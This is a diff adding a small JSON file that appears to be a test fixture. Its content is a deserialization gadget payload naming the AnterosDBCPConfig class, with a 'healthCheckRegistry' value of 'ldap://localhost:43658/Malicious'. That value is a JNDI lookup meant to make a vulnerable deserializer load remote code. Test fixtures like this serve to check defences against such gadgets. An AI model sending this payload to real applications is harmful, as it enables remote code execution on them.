@@ -1,0 +1,6 @@
+[
+    "br.com.anteros.dbcp.AnterosDBCPConfig",
+    {
+        "healthCheckRegistry": "ldap://localhost:43658/Malicious"
+    }
+]
